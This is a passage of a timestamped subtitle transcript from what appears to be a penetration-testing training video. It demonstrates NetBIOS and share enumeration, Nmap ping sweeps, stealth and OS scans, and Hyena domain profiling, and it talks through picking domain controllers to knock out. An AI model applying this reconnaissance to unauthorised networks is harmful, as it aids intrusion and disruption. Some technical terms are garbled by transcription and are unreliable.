there.\n\n753\n00:34:06.230 --> 00:34:10.920\nBut then if I minimize, right,\nhow do I wanna open this type of file?\n\n754\n00:34:10.920 --> 00:34:13.120\nSo there's my report,\nwhat do I wanna do, right?\n\n755\n00:34:13.120 --> 00:34:14.840\nSo I can choose the browser.\n\n756\n00:34:14.840 --> 00:34:19.410\nIt doesn't really matter what, it's a web\nHTM file, it will open with anything.\n\n757\n00:34:19.410 --> 00:34:23.770\nAnd then I'll be able to take a look\nat this, much like I got with purports,\n\n758\n00:34:23.770 --> 00:34:25.230\nright, or super scan, rather.\n\n759\n00:34:25.230 --> 00:34:26.370\nWhere I can go in and grab that.\n\n760\n00:34:26.370 --> 00:34:29.202\nAnd you'll see it's kinda the same,\nand has a similar look and feel,\n\n761\n00:34:29.202 --> 00:34:30.160\noutputs all that.\n\n762\n00:34:30.160 --> 00:34:32.970\nSo we take this and we use this for\nour documentation, right?\n\n763\n00:34:32.970 --> 00:34:36.280\nWhen we're doing our pen test,\nwe give it back to the customer, hey look,\n\n764\n00:34:36.280 --> 00:34:38.410\nhere's all the stuff that we found, right?\n\n765\n00:34:38.410 --> 00:34:39.200\nSo that's kinda nice.\n\n766\n00:34:39.200 --> 00:34:39.920\nSo we can go in.\n\n767\n00:34:39.920 --> 00:34:40.710\nWe can do that.\n\n768\n00:34:42.230 --> 00:34:43.170\nSo we got that running.\n\n769\n00:34:43.170 --> 00:34:44.790\nLet's just bring the tool back up.\n\n770\n00:34:44.790 --> 00:34:46.260\nSo we go, we can take a look at that.\n\n771\n00:34:46.260 --> 00:34:48.290\nLet's just scroll down here a little bit.\n\n772\n00:34:48.290 --> 00:34:50.480\nLook at something like 201, and\n\n773\n00:34:50.480 --> 00:34:53.070\nlet's look at all the information\nI have on this machine.\n\n774\n00:34:53.070 --> 00:34:55.910\nSo it's not just hey NetBIOS and\nadapter, but\n\n775\n00:34:55.910 --> 00:34:57.880\nlook at all the other stuff I have here.\n\n776\n00:34:57.880 --> 00:35:01.090\nI've got the ability to\ndump the NetBIOS cache, so\n\n777\n00:35:01.090 --> 00:35:05.070\nI can see from NetBIOS enumeration, which\nI can use separately as another tool by\n\n778\n00:35:05.070 --> 00:35:08.580\nthe way, within a BIOS scanner,\nhave the option of us to get that.\n\n779\n00:35:08.580 --> 00:35:13.160\nBut here, I'm combining it all, so on this\nmachine, .201, I can see all the BIOS\n\n780\n00:35:13.160 --> 00:35:17.360\nnames that are running services,\nso domain master browser,\n\n781\n00:35:17.360 --> 00:35:21.432\nmaster browser, file master workstation,\nthat's gotta be a Windows machine, right?\n\n782\n00:35:21.432 --> 00:35:22.650\n>> [LAUGH]\n>> I'm thinking, right?\n\n783\n00:35:22.650 --> 00:35:27.360\nThe domain name service is there,\nthat's gotta be a Windows machine, right?\n\n784\n00:35:27.360 --> 00:35:28.320\nSo I got all that.\n\n785\n00:35:28.320 --> 00:35:29.460\nGot the adapter information.\n\n786\n00:35:29.460 --> 00:35:31.145\nGot the domain I'm joined to.\n\n787\n00:35:31.145 --> 00:35:34.245\nSNMP if it's there, shared resources.\n\n788\n00:35:34.245 --> 00:35:35.545\nHere's the shares.\n\n789\n00:35:35.545 --> 00:35:39.606\nI've got the IPC share there,\nright, shows me the type, the path.\n\n790\n00:35:39.606 --> 00:35:41.230\nThat's not useful information, right?\n\n791\n00:35:41.230 --> 00:35:44.230\nDon't wanna know the path,\nthat would never be important.\n\n792\n00:35:44.230 --> 00:35:47.580\nHow about max user cap on\nthe session to connect?\n\n793\n00:35:47.580 --> 00:35:48.100\nUnlimited.\n\n794\n00:35:48.100 --> 00:35:50.043\nThat's probably helpful to know.\n\n795\n00:35:50.043 --> 00:35:51.909\nGot system shares there as well.\n\n796\n00:35:51.909 --> 00:35:53.610\nGives me information on the system.\n\n797\n00:35:53.610 --> 00:35:55.920\nSee system unlimited, etc., right?\n\n798\n00:35:55.920 --> 00:35:59.920\nSo you know it's joined to whatever,\nI can see all that.\n\n799\n00:35:59.920 --> 00:36:02.120\nI got the config information.\n\n800\n00:36:02.120 --> 00:36:04.471\nShows me what's going on there, all right?\n\n801\n00:36:04.471 --> 00:36:06.270\nSo I got all of that.\n\n802\n00:36:06.270 --> 00:36:07.160\nWhat else to we have?\n\n803\n00:36:07.160 --> 00:36:08.288\nWe've got users.\n\n804\n00:36:08.288 --> 00:36:11.327\nShows me here root as a user, right?\n\n805\n00:36:11.327 --> 00:36:12.680\nDelta as a user.\n\n806\n00:36:12.680 --> 00:36:15.020\nI got groups, trusted domains,\nlocal drives.\n\n807\n00:36:15.020 --> 00:36:15.520\nYou name it.\n\n808\n00:36:15.520 --> 00:36:16.186\nI got all that stuff.\n\n809\n00:36:16.186 --> 00:36:18.637\nI can even see if there's a modem\ninstalled, [LAUGH], right?\n\n810\n00:36:18.637 --> 00:36:20.255\nCuz that becomes important, right?\n\n811\n00:36:20.255 --> 00:36:21.440\n>> [LAUGH]\n>> I can see all sorts of stuff so\n\n812\n00:36:21.440 --> 00:36:22.800\nyou can see here, right,\n\n813\n00:36:22.800 --> 00:36:27.810\nthat I got all sorts of crazy\ninformation being pulled out by this.\n\n814\n00:36:27.810 --> 00:36:29.105\nWas that Angie's machine\nthat just went by?\n\n815\n00:36:29.105 --> 00:36:30.060\nI think was Angie's machine.\n\n816\n00:36:30.060 --> 00:36:31.370\n>> [LAUGH]\n>> I just saw right there.\n\n817\n00:36:31.370 --> 00:36:35.850\nSo I could see all sorts of stuff, right,\nso this tool becomes really valuable.\n\n818\n00:36:35.850 --> 00:36:36.800\nNow I can break it down.\n\n819\n00:36:36.800 --> 00:36:39.370\nI can just go in to look at shares,\nand I can open up and\n\n820\n00:36:39.370 --> 00:36:43.370\nsee what shared resources may be\navailable on certain machines.\n\n821\n00:36:43.370 --> 00:36:46.670\nAnd so if there are shares available,\nI'll be able to find them.\n\n822\n00:36:46.670 --> 00:36:51.100\nSo there's one with system and\nan IPC-share.\n\n823\n00:36:51.100 --> 00:36:53.640\nThere's another one with remote admin.\n\n824\n00:36:53.640 --> 00:36:58.560\nAnd the default share and admin $C$ at\n\n825\n00:36:58.560 --> 00:37:03.470\nlogon SYSMOL, well that's definitely\ngonna be telling us something right?\n\n826\n00:37:03.470 --> 00:37:04.388\n>> Domain controller.\n\n827\n00:37:04.388 --> 00:37:06.088\n>> And so it's gonna tell us what that is.\n\n828\n00:37:06.088 --> 00:37:07.740\nTell us the path, right?\n\n829\n00:37:07.740 --> 00:37:09.770\nGives us information about it, right?\n\n830\n00:37:09.770 --> 00:37:10.870\nSo that's nice.\n\n831\n00:37:10.870 --> 00:37:15.430\nNotice I can also go in and open the share\nright from here, so I can delve in, right?\n\n832\n00:37:15.430 --> 00:37:17.040\nSo I've got a lot of resources here.\n\n833\n00:37:17.040 --> 00:37:18.930\nI could just get that NetBIOS information,\n\n834\n00:37:18.930 --> 00:37:21.170\nenumerate that out specifically as well,\nright?\n\n835\n00:37:21.170 --> 00:37:25.550\nI can do the IP scan, so I can just pull\nup the Mac addresses, the IP addresses.\n\n836\n00:37:25.550 --> 00:37:27.760\nI can get the status of the DTLs.\n\n837\n00:37:27.760 --> 00:37:30.640\nI can get the local system info\nrunning on this machine, so\n\n838\n00:37:30.640 --> 00:37:34.170\ndo essentially NBT Stat where\nI get all that information.\n\n839\n00:37:34.170 --> 00:37:36.799\nProcess Info, this tool gives us\nthe ability to go drill in and\n\n840\n00:37:36.799 --> 00:37:38.681\nsee all the processes he's running again.\n\n841\n00:37:38.681 --> 00:37:40.680\nAnd just like we talked about,\nvery similar.\n\n842\n00:37:40.680 --> 00:37:44.840\nBut we've also got Traceroute, Whois,\ndo all that lookup stuff right from here.\n\n843\n00:37:44.840 --> 00:37:46.846\nI did the Whois lookup on IT ProTV.\n\n844\n00:37:46.846 --> 00:37:48.140\nPulled it all in.\n\n845\n00:37:48.140 --> 00:37:50.000\nSo I have it all right there in one place,\nright?\n\n846\n00:37:50.000 --> 00:37:54.220\nSo I can do all this kind of stuff,\nas you can see,\n\n847\n00:37:54.220 --> 00:37:58.360\nusing a variety of these different kinds\nof tools, right, and it's not hard to do,\n\n848\n00:37:58.360 --> 00:38:00.170\nwhen we go in and take a look at them.\n\n849\n00:38:00.170 --> 00:38:03.779\nIt's just a matter of making sure that,\nagain, we understand what's happening, and\n\n850\n00:38:03.779 --> 00:38:06.415\nwe understand that there's\nessentially the same thing over and\n\n851\n00:38:06.415 --> 00:38:07.661\nover again with these tools.\n\n852\n00:38:07.661 --> 00:38:10.075\nJust a variety of different\ntools that let us do that.\n\n853\n00:38:10.075 --> 00:38:13.078\nAll right, so we've gone through\nthree tools so far, right?\n\n854\n00:38:13.078 --> 00:38:14.442\n>> Yep.\n>> There's two others I wanna\n\n855\n00:38:14.442 --> 00:38:14.999\ntake a look at.\n\n856\n00:38:14.999 --> 00:38:18.290\nI wanna show you hyena, which we'll\ntake a look at here in a minute.\n\n857\n00:38:18.290 --> 00:38:21.490\nBut I wanna also show what this\nmay look like from the Linux side.\n\n858\n00:38:21.490 --> 00:38:23.390\nSo why don't you go to\nthe kali box real quick.\n\n859\n00:38:23.390 --> 00:38:26.115\nWe've already done it in Apple, we'll go\nback in, we'll just take a look at it.\n\n860\n00:38:26.115 --> 00:38:28.460\nKinda get a sense what's going on\nthere and then we'll come back.\n\n861\n00:38:28.460 --> 00:38:32.270\nWe'll take a look at Hyena and then we'll\nwrap up our conversation here doing that.\n\n862\n00:38:32.270 --> 00:38:35.970\nSo let's just get back into our kali\nbox cuz it's been sitting idle for\n\n863\n00:38:35.970 --> 00:38:39.490\na while, so like all good Linux\nboxes it'll just time out, and\n\n864\n00:38:39.490 --> 00:38:43.830\nI've already gone through the trouble\nof just searching for and loading Nmap.\n\n865\n00:38:43.830 --> 00:38:46.000\nWe've talked about how to that\nin some of our prior demos.\n\n866\n00:38:46.000 --> 00:38:48.020\nSo I'm thinking at this point\nwe can just go ahead and\n\n867\n00:38:48.020 --> 00:38:50.630\nassume you know that you can search for\nit, load up the tools.\n\n868\n00:38:50.630 --> 00:38:56.930\nSo we have Nmap loaded up there, and\nwhat we're gonna do is go out and,\n\n869\n00:38:56.930 --> 00:39:01.120\nwe've talked about how to do a ping sweep,\nfor instance, right, on Nmap.\n\n870\n00:39:01.120 --> 00:39:04.110\nWhere of course if I spell it correctly,\nthat would be, you know what I need?\n\n871\n00:39:04.110 --> 00:39:06.020\nI need, like, Dragon or something.\n\n872\n00:39:06.020 --> 00:39:10.360\nSo I could just say Nmap minus s,\ncapital D, and it will just go do that.\n\n873\n00:39:10.360 --> 00:39:11.890\nI don't have to worry about typing.\n\n874\n00:39:11.890 --> 00:39:14.605\nCuz it'll be so\nmuch quicker if I did that, right?\n\n875\n00:39:14.605 --> 00:39:16.290\n10.1.230.\n\n876\n00:39:16.290 --> 00:39:18.090\n>> We'll put in a requisition order for\nyou.\n\n877\n00:39:18.090 --> 00:39:19.315\n>> Yeah exactly, right?\n\n878\n00:39:19.315 --> 00:39:25.151\n>> [LAUGH]\n>> Dot, what are we gonna do?\n\n879\n00:39:25.151 --> 00:39:26.983\n>> 233?\n\n880\n00:39:26.983 --> 00:39:28.782\n>> 230.\n\n881\n00:39:28.782 --> 00:39:32.451\nNo I wanna do the range .1, right?\n\n882\n00:39:32.451 --> 00:39:38.544\nAnd or I'll just do just .1,\nand then whats our subnet?\n\n883\n00:39:38.544 --> 00:39:39.938\n>> 255.255\n\n884\n00:39:39.938 --> 00:39:41.049\n>> Slash\n>> 24.\n\n885\n00:39:41.049 --> 00:39:41.932\n>> Slash 24, right?\n\n886\n00:39:41.932 --> 00:39:46.340\nOkay, so\n/ do 0/24 that way I'll do the range.\n\n887\n00:39:47.700 --> 00:39:50.310\nYou know and do that.\n\n888\n00:39:50.310 --> 00:39:54.822\nBy doing this command, -sP,\nspecify the IP range, slash, and\n\n889\n00:39:54.822 --> 00:39:58.595\nthen the short hand notification for\nthe subnet mask,\n\n890\n00:39:58.595 --> 00:40:03.536\nI'm able to go out and do a quick ping\nsweep on the entire range, right?\n\n891\n00:40:03.536 --> 00:40:04.069\n>> Mm-hm.\n\n892\n00:40:04.069 --> 00:40:04.586\n>> So I did that.\n\n893\n00:40:04.586 --> 00:40:06.137\nI got back a bunch of stuff.\n\n894\n00:40:06.137 --> 00:40:10.817\nLooks like out of 256 IP addresses\nin four and half seconds, right?\n\n895\n00:40:10.817 --> 00:40:11.871\nGotta love Linux, right?\n\n896\n00:40:11.871 --> 00:40:12.685\n>> I know.\n[LAUGH]\n\n897\n00:40:12.685 --> 00:40:14.228\n>> 64 hosts are up out of the range.\n\n898\n00:40:14.228 --> 00:40:14.837\nRight?\n\n899\n00:40:14.837 --> 00:40:19.529\nSo, I've got just under 200 that\nare not live, but about 64 that are.\n\n900\n00:40:19.529 --> 00:40:23.680\nWe typically would start out by doing\nsomething like a quick ping sweep, right?\n\n901\n00:40:23.680 --> 00:40:26.760\nJust to get a sense of what's going on\nthere in the range, and then what we may\n\n902\n00:40:26.760 --> 00:40:30.395\nwant to do is go in, and we may want\nto go ahead and do a stealthy scan.\n\n903\n00:40:30.395 --> 00:40:32.855\nNow we've talked about this before,\nwe demoed this before.\n\n904\n00:40:32.855 --> 00:40:34.535\nSince we're talking about enumerations,\n\n905\n00:40:34.535 --> 00:40:38.585\nprobably good to go back,\ntake a look again, so -s is for scan.\n\n906\n00:40:38.585 --> 00:40:41.480\nCapital S for stealthy, right, so that's\nwhat's gonna tell us what kind of scan.\n\n907\n00:40:41.480 --> 00:40:44.450\nRemember, we talked about\nthe important to know switches, right?\n\n908\n00:40:44.450 --> 00:40:47.210\nCapital, lowercase,\nwhat's going on, right?\n\n909\n00:40:47.210 --> 00:40:50.930\nSo lowercase s for scan type,\nand then what's the scan type?\n\n910\n00:40:50.930 --> 00:40:52.255\nBig S for stealthy, right?\n\n911\n00:40:52.255 --> 00:40:56.390\n>> Mm-hm.\n>> So, we're gonna do that, we're gonna go\n\n912\n00:40:56.390 --> 00:41:00.622\nand we're gonna do, let's do 10.1.230.221,\n\n913\n00:41:00.622 --> 00:41:06.400\nI think was one of our machines\nif I remember correctly right?\n\n914\n00:41:06.400 --> 00:41:09.970\nNo, wasn't up and running, okay,\nso that's not up and running.\n\n915\n00:41:09.970 --> 00:41:14.420\nLet's do 223, we know 223 is up and\nrunning, we're not gonna guess\n\n916\n00:41:14.420 --> 00:41:18.100\nat what the range was, it should know\nall the IP Addresses sitting up here.\n\n917\n00:41:18.100 --> 00:41:21.070\nSo, I just thought I remember,\nthis no 221 that was the main controller,\n\n918\n00:41:21.070 --> 00:41:23.720\nbut It may have been a different IP,\nso that's not a big deal.\n\n919\n00:41:23.720 --> 00:41:26.580\nSo you see here, 223 is my Windows 8\nmachine, the one I was just on, and\n\n920\n00:41:26.580 --> 00:41:29.900\nyou can see when I scan it, we get a quick\nhit list of all the ports that are up and\n\n921\n00:41:29.900 --> 00:41:30.540\nrunning and known.\n\n922\n00:41:30.540 --> 00:41:33.760\nSo you can see I got that, but with a\nstealthy scan, that scan's not going to be\n\n923\n00:41:33.760 --> 00:41:37.150\ndetected traditionally, because it's gonna\nbe slow, we're not gonna see it, and\n\n924\n00:41:37.150 --> 00:41:42.440\nit's not going to hopefully show\nup on the radar at the machine or\n\n925\n00:41:42.440 --> 00:41:46.050\non any of the monitors that I\nmay be using in the background.\n\n926\n00:41:46.050 --> 00:41:51.210\nSo when we run this we can get a general\npicture real quick about what's going on.\n\n927\n00:41:51.210 --> 00:41:55.630\nNow, we can also do version detection and\nOS detection using right,\n\n928\n00:41:55.630 --> 00:41:56.560\nwhich is kind of cool.\n\n929\n00:41:56.560 --> 00:42:00.670\nJust like if you remember on the Windows\nsystem, Zenmap, we could check those boxes\n\n930\n00:42:00.670 --> 00:42:05.320\noff, minus capital O for\nOperating system, capital V for\n\n931\n00:42:05.320 --> 00:42:08.760\nversion along with capital S for stealthy\nscan so we're going to go ahead and\n\n932\n00:42:08.760 --> 00:42:11.920\ntype this in again but we're going to\nadd a couple switches here, right?\n\n933\n00:42:11.920 --> 00:42:17.560\nSo, minus s for scan type, capital s for\ndo stealthy, capital v for\n\n934\n00:42:17.560 --> 00:42:22.830\nversion, then minus capital o for\noperating system detection.\n\n935\n00:42:22.830 --> 00:42:25.750\nMake sure that's not a 0 because\nyou will not like the results.\n\n936\n00:42:25.750 --> 00:42:27.280\nAnd 10.1.230.223, right?\nSo let's do that.\n\n937\n00:42:27.280 --> 00:42:32.900\nWhat was your IP, I know we were\ntalking about [INAUDIBLE] Or\n\n938\n00:42:32.900 --> 00:42:34.730\ngive it to me real quick,\n\n939\n00:42:34.730 --> 00:42:38.600\nlet me do yours, show them the difference\nbetween a Windows and a Mac system, right.\n\n940\n00:42:38.600 --> 00:42:40.800\n>> I wanna say I'm 144, but\nlet me double check that, 141.\n\n941\n00:42:40.800 --> 00:42:43.985\n>> 141, right, so we'll do Mike's\nin a minute, Mike's running a Mac.\n\n942\n00:42:43.985 --> 00:42:48.610\nOS; whereas, the machine I'm scanning\nright now is a Windows OS, and remember,\n\n943\n00:42:48.610 --> 00:42:49.450\nwe saw this yesterday.\n\n944\n00:42:49.450 --> 00:42:54.300\nIt came back and said, \"Maybe Windows 7,\nWindows 8 or 8.1 or something else.\"\n\n945\n00:42:54.300 --> 00:42:54.880\n>> In the ballpark.\n\n946\n00:42:54.880 --> 00:42:57.060\n>> It's at least going to\nget us in the ballpark.\n\n947\n00:42:57.060 --> 00:42:58.400\nSo, we'll wait for this to come back.\n\n948\n00:42:58.400 --> 00:43:01.330\nThis scan does take A slightly bit-\n>> A slightly bit.\n\n949\n00:43:01.330 --> 00:43:02.591\n>> A slightly bit longer.\n\n950\n00:43:02.591 --> 00:43:06.000\n>> [LAUGH]\n>> A slight bit longer than the normal\n\n951\n00:43:06.000 --> 00:43:08.430\nstealth scan we did, where it was just\nhey look at the ports real quick and\n\n952\n00:43:08.430 --> 00:43:11.450\ncome back, cuz we're querying and\nlooking for OS and\n\n953\n00:43:11.450 --> 00:43:14.215\nversion it's going to take a little\n>> A little longer to pull that out.\n\n954\n00:43:14.215 --> 00:43:16.815\nSo we're gonna wait for that,\nwe'll definitely get that to come back,\n\n955\n00:43:16.815 --> 00:43:19.605\nwhen it does we'll be able\nto see the details here.\n\n956\n00:43:19.605 --> 00:43:20.945\nAnd then, you said 144?\n\n957\n00:43:20.945 --> 00:43:24.145\n>> 141.\n>> 141, okay, then we'll do\n\n958\n00:43:24.145 --> 00:43:27.020\nMike's as soon as his comes back\n>> We'll just be able to compare\n\n959\n00:43:27.020 --> 00:43:28.160\nthe differences for you.\n\n960\n00:43:28.160 --> 00:43:31.490\nThen I just want to show you how\nyou can output this to a text file.\n\n961\n00:43:31.490 --> 00:43:35.480\nBecause typically, unless you're going to\nbe one to keep scrolling back through,\n\n962\n00:43:35.480 --> 00:43:38.340\nright, that's not going to be imported,\nso just be aware of that.\n\n963\n00:43:40.240 --> 00:43:44.630\nIt looks like we may actually be up and\nrunning again.\n\n964\n00:43:44.630 --> 00:43:46.250\n>> Yes, right, stream is good.\n\n965\n00:43:46.250 --> 00:43:47.380\n>> Yup, okay, good, all right.\n\n966\n00:43:47.380 --> 00:43:51.660\nSo while waiting on it to come back let's\njust do the following here really quick.\n\n967\n00:43:51.660 --> 00:43:55.790\nLet me minimize that, let's not waster our\ntime just waiting and waiting and waiting.\n\n968\n00:43:55.790 --> 00:43:59.730\nLet's come in here and we got an arrow\nlook at that one What happened here?\n\n969\n00:43:59.730 --> 00:44:01.330\nThe following errors were encountered.\n\n970\n00:44:01.330 --> 00:44:04.010\nIt looks like we got a little error with\none of our services that are running.\n\n971\n00:44:04.010 --> 00:44:05.160\n>> Awesome.\n\n972\n00:44:05.160 --> 00:44:08.010\n>> So let’s just take a look at\nHyena while we’re waiting on that\n\n973\n00:44:08.010 --> 00:44:10.910\nscan to finish, cause that may take\na couple minutes to come back.\n\n974\n00:44:10.910 --> 00:44:14.120\nI don't want you to sit here Listen\nto me babble on about stuff.\n\n975\n00:44:14.120 --> 00:44:16.360\nSo let's take a look at this\nother tool we were talking about.\n\n976\n00:44:16.360 --> 00:44:20.880\nSo Hyena is gonna allow us to go in and\nto do a variety of things.\n\n977\n00:44:20.880 --> 00:44:24.800\nIt's essentially going to allow us to\ndo a lot of the stuff we already saw.\n\n978\n00:44:24.800 --> 00:44:27.390\nShow us sessions, show us services.\n\n979\n00:44:27.390 --> 00:44:30.290\nShow us devices,\nprofile stuff on the local machine.\n\n980\n00:44:30.290 --> 00:44:32.478\nAnd you could see right up top here.\n\n981\n00:44:32.478 --> 00:44:38.400\nWin 8.1 ENT Enterprise CL1,\nwhatever, local station.\n\n982\n00:44:38.400 --> 00:44:40.410\nI could see all that stuff,\nbut that's child's play.\n\n983\n00:44:40.410 --> 00:44:43.400\nI mean, you could get that stuff sitting\non a local machine from anywhere.\n\n984\n00:44:43.400 --> 00:44:44.730\nSo I don't really care about that.\n\n985\n00:44:44.730 --> 00:44:47.880\nSo let's just Minimize that cuz we're\nnot even interested in that, but\n\n986\n00:44:47.880 --> 00:44:51.330\nthen we have the ability to go out and\nlook at under the enterprise and\n\n987\n00:44:51.330 --> 00:44:54.720\nspecifically by adding a domain,\ndomain related resources.\n\n988\n00:44:54.720 --> 00:44:57.140\nSo we're going to focus on\nthe domain piece here and so\n\n989\n00:44:57.140 --> 00:45:00.510\nyou see I've got the IT\npro dot local domain.\n\n990\n00:45:00.510 --> 00:45:01.890\nI'll add it in here, right?\n\n991\n00:45:01.890 --> 00:45:03.620\nSo, you can see that I've got that here.\n\n992\n00:45:03.620 --> 00:45:06.760\nI could view FSMO roles and\nthat might be important to know.\n\n993\n00:45:06.760 --> 00:45:08.210\n>> Right.\n>> I could look at account policy,\n\n994\n00:45:08.210 --> 00:45:13.350\naudit policy, show trust relationships,\nI can synchronize the domain.\n\n995\n00:45:13.350 --> 00:45:14.190\nThat may be important.\n\n996\n00:45:14.190 --> 00:45:16.260\n>> [LAUGH]\n>> I can look at authentication\n\n997\n00:45:16.260 --> 00:45:20.090\ncredentials, set domain controllers,\nI do a lot of stuff here, right?\n\n998\n00:45:20.090 --> 00:45:22.660\nSo, if I view roles, what do I get there?\n\n999\n00:45:22.660 --> 00:45:25.000\nNow, reality is I only have\none domain controller running,\n\n1000\n00:45:25.000 --> 00:45:28.680\nso, I've got everything on one\nmachine by default because\n\n1001\n00:45:28.680 --> 00:45:31.360\nwe didn't bother to spread out and\ncrank three domain controllers,\n\n1002\n00:45:31.360 --> 00:45:33.960\nmove all the roles around just for\none demo here, but She got the idea.\n\n1003\n00:45:33.960 --> 00:45:38.860\nThe real world writing most likely in\na well architected, well secured network.\n\n1004\n00:45:38.860 --> 00:45:41.920\nYou would see that there are different\ndomain controls hosting these rolls from\n\n1005\n00:45:41.920 --> 00:45:45.340\na BCDR continuity disaster\nrecovery prospective.\n\n1006\n00:45:45.340 --> 00:45:47.710\nWe wouldn't want all these\nrolls running on one machine.\n\n1007\n00:45:47.710 --> 00:45:48.870\nThat would be bad,\n\n1008\n00:45:48.870 --> 00:45:52.350\nbecause then I could come along and\nthat machine goes down essentially.\n\n1009\n00:45:52.350 --> 00:45:53.610\nRight, I may have a problem.\n\n1010\n00:45:53.610 --> 00:45:55.160\nBut I can profile what's here.\n\n1011\n00:45:55.160 --> 00:45:58.420\nIf I'm a hacker on\nthe inside I'm a bad actor,\n\n1012\n00:45:58.420 --> 00:46:02.050\nI've managed to break through\nyour firewall and your defenses.\n\n1013\n00:46:02.050 --> 00:46:06.130\nI've zombied a machine or two,\nI'm running remote control software and\n\n1014\n00:46:06.130 --> 00:46:09.210\nnow I've got a pipe that allows me to come\nin and essentially exist on the inside,\n\n1015\n00:46:09.210 --> 00:46:13.210\nbehind the firewall And I'm running\nthis kind of software, you know,\n\n1016\n00:46:13.210 --> 00:46:16.460\nI was not asked to authenticate,\nright, to be able to find that.\n\n1017\n00:46:16.460 --> 00:46:19.390\nAll I had to do was point\nthe tool out on the network and\n\n1018\n00:46:19.390 --> 00:46:21.240\nI'm able to pull that information down.\n\n1019\n00:46:21.240 --> 00:46:23.850\nNow, I may have to provide\ncredentials to do some of this stuff,\n\n1020\n00:46:23.850 --> 00:46:26.790\nbut I wasn't asked to provide\ncredentials to get that information.\n\n1021\n00:46:26.790 --> 00:46:27.340\nRight?\n\n1022\n00:46:27.340 --> 00:46:30.420\nWhich means that that information may,\nin and\n\n1023\n00:46:30.420 --> 00:46:33.260\nof itself,\nnot be incredibly valuable but remember\n\n1024\n00:46:33.260 --> 00:46:35.200\nwe eat the elephant one bite at a time\n>> that's it\n\n1025\n00:46:35.200 --> 00:46:37.240\n>> by aggregating that information up\n\n1026\n00:46:37.240 --> 00:46:39.080\n>> Because now I've told the hacker\n\n1027\n00:46:39.080 --> 00:46:42.950\nwhat machines are my domain controllers,\nI've given him or her the names so\n\n1028\n00:46:42.950 --> 00:46:46.720\nhe can do a ping sweep, find out what\nthose IP addresses are, target one or\n\n1029\n00:46:46.720 --> 00:46:51.510\nmore of those machines with a sin flood\nand take them out and everything goes now.\n\n1030\n00:46:51.510 --> 00:46:53.050\nI mean it would not be hard.\n\n1031\n00:46:53.050 --> 00:46:55.910\n>> You talked about time synchronisation\nand how important it was in windows\n\n1032\n00:46:55.910 --> 00:46:59.060\nenvironment and we've learned from\nother classes and other episodes.\n\n1033\n00:46:59.060 --> 00:47:02.420\nWhich one does that, the PVC emulator,\nthat's one of those physmo roles.\n\n1034\n00:47:02.420 --> 00:47:05.480\nSo if you see that there,\nnow I know which machine to target,\n\n1035\n00:47:05.480 --> 00:47:07.820\nto potentially take out\nyour time synchronization.\n\n1036\n00:47:07.820 --> 00:47:10.395\n>> Absolutely, right, absolutely,\nthere's a lot of valuable.\n\n1037\n00:47:10.395 --> 00:47:13.770\n>> [LAUGH]\n>> Lot of valuable information.\n\n1038\n00:47:13.770 --> 00:47:16.860\nI'm always in the center of frame when\nI'm talking because I'm a good presenter.\n\n1039\n00:47:16.860 --> 00:47:20.500\nYou gotta stop doing that to me until\nyou tell me when I'm supposed to move.\n\n1040\n00:47:20.500 --> 00:47:23.380\nAll right so just keep in mind that\nit's going to be important and\n\n1041\n00:47:23.380 --> 00:47:26.290\nas Mike was saying it is about\nknowing what those roles are.\n\n1042\n00:47:26.290 --> 00:47:28.940\nThe PVC emulator role does many things,\n\n1043\n00:47:28.940 --> 00:47:31.480\nalso happens to handle time\nsynchronization, that's real important.\n\n1044\n00:47:31.480 --> 00:47:34.580\nGlobal catalog services, typically are\nspread across all the main controllers.\n\n1045\n00:47:34.580 --> 00:47:36.910\nDNS may be active directory integrated,\n\n1046\n00:47:36.910 --> 00:47:40.840\nif it is, take out any one of those domain\ncontrollers, you take out a DNS server.\n\n1047\n00:47:40.840 --> 00:47:43.580\nTake them all out,\nyou take out all DNS servers, right.\n\n1048\n00:47:43.580 --> 00:47:44.660\nAnd that's important.\n\n1049\n00:47:44.660 --> 00:47:47.230\nWhat about looking at the routing\ntopology and figuring out, right,\n\n1050\n00:47:47.230 --> 00:47:48.270\nhow we're replicating.\n\n1051\n00:47:48.270 --> 00:47:50.360\nThere's a lot of stuff you could do there.\n\n1052\n00:47:50.360 --> 00:47:53.340\nAnd that may lead me to other\nsystems in other domains or\n\n1053\n00:47:53.340 --> 00:47:54.810\nother trees in the forest.\n\n1054\n00:47:54.810 --> 00:47:57.940\nAnd perhaps federated relationships\nwith other forests That I can map out.\n\n1055\n00:47:57.940 --> 00:48:01.500\nAnd I many be able to take out your\nnetwork and all of the subsidiary networks\n\n1056\n00:48:01.500 --> 00:48:04.350\nthat are connected to yours as\npart of that as well, right?\n\n1057\n00:48:04.350 --> 00:48:07.101\nSo let's go back in and\nlet's take a look at some more stuff.\n\n1058\n00:48:07.101 --> 00:48:10.263\nSo we can go in and\nlook here at what I have.\n\n1059\n00:48:10.263 --> 00:48:11.074\nLookey here, as they say.\n\n1060\n00:48:11.074 --> 00:48:12.700\n>> [LAUGH]\n>> Right, in my part of the world.\n\n1061\n00:48:12.700 --> 00:48:14.733\nI have all the containers in ou's.\n\n1062\n00:48:14.733 --> 00:48:15.790\n>> Nice, nice.\n\n1063\n00:48:15.790 --> 00:48:16.438\n>> And I can pull those out.\n\n1064\n00:48:16.438 --> 00:48:19.721\nSo, I can open up here for\ninstance under computers, and I\n\n1065\n00:48:19.721 --> 00:48:24.150\ncan see the two computers that are listed\nthere and I can open up that computer.\n\n1066\n00:48:24.150 --> 00:48:27.510\nAnd I have all the local information\navailable to me if I want to get it.\n\n1067\n00:48:27.510 --> 00:48:28.040\n>> Wow.\n\n1068\n00:48:28.040 --> 00:48:29.640\nOr if I'm on another machine.\n\n1069\n00:48:29.640 --> 00:48:31.770\nNow, the Windows 7 machine\nis not on right now,\n\n1070\n00:48:31.770 --> 00:48:33.110\nyou can see it's joined into the domain.\n\n1071\n00:48:33.110 --> 00:48:36.610\nBut if I had it on, I could actually reach\nout remotely and profile that machine.\n\n1072\n00:48:36.610 --> 00:48:39.090\nSo, I've got an ability\nto see all those objects.\n\n1073\n00:48:39.090 --> 00:48:40.950\nI can see the system container.\n\n1074\n00:48:40.950 --> 00:48:43.630\nLet's see if you're running,\nI don't know, SharePoint?\n\n1075\n00:48:43.630 --> 00:48:46.240\nMaybe you're running System Centre,\nmaybe you're running Exchange.\n\n1076\n00:48:46.240 --> 00:48:49.410\nI can probably tell that by looking for\nsystem containers and looking for\n\n1077\n00:48:49.410 --> 00:48:51.250\nobjects that are created in AD.\n\n1078\n00:48:51.250 --> 00:48:53.930\nMight give me some information\nabout when I want a good target,\n\n1079\n00:48:53.930 --> 00:48:54.950\nthat might be helpful.\n\n1080\n00:48:54.950 --> 